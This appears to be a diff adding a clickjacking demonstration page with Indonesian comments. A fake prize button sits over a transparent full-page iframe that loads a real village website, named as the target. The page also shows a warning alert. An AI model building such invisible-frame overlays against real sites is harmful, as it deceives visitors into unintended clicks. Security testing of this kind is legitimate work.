@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Click Here to Win a Prize!</title>
+    <style>
+        /* Mengatur iframe agar transparan dan menutupi seluruh halaman */
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0; /* Membuat iframe transparan agar tidak terlihat oleh pengguna */
+            pointer-events: none; /* Membuat iframe tidak bisa diklik langsung */
+        }
+
+        /* Tombol yang terlihat oleh pengguna */
+        #clickable {
+            position: relative;
+            z-index: 100; /* Menempatkan tombol di atas iframe */
+            background-color: #4CAF50; /* Warna hijau tombol */
+            color: white;
+            font-size: 20px;
+            width: 300px;
+            height: 150px;
+            text-align: center;
+            line-height: 150px;
+            cursor: pointer;
+            border-radius: 10px;
+            box-shadow: 0px 5px 10px rgba(0, 0, 0, 0.3);
+            transition: background-color 0.3s ease;
+        }
+
+        #clickable:hover {
+            background-color: #45a049; /* Hover effect untuk tombol */
+        }
+
+        /* Menambahkan teks penjelasan di bawah tombol */
+        #info {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 16px;
+            color: #555;
+        }
+    </style>
+</head>
+<body>
+    <!-- Tombol yang terlihat oleh pengguna, seolah-olah mereka bisa klik untuk hadiah -->
+    <div id="clickable">Klik untuk Menang Hadiah!</div>
+
+    <!-- Iframe yang berisi halaman target (misalnya kerta.desa.id) -->
+    <iframe src="https://kerta.desa.id/" frameborder="0"></iframe>
+
+    <div id="info">
+        <p>Anda tidak akan menyadari bahwa Anda mengklik tombol yang tersembunyi di dalam iframe.</p>
+        <p>Harap berhati-hati!</p>
+    </div>
+
+    <script>
+        // Menghentikan aksi default dan memberikan peringatan
+        document.getElementById("clickable").onclick = function() {
+            alert("Tindakan yang tidak sah dilakukan! Anda mengklik elemen yang tersembunyi.");
+        };
+    </script>
+</body>
+</html>
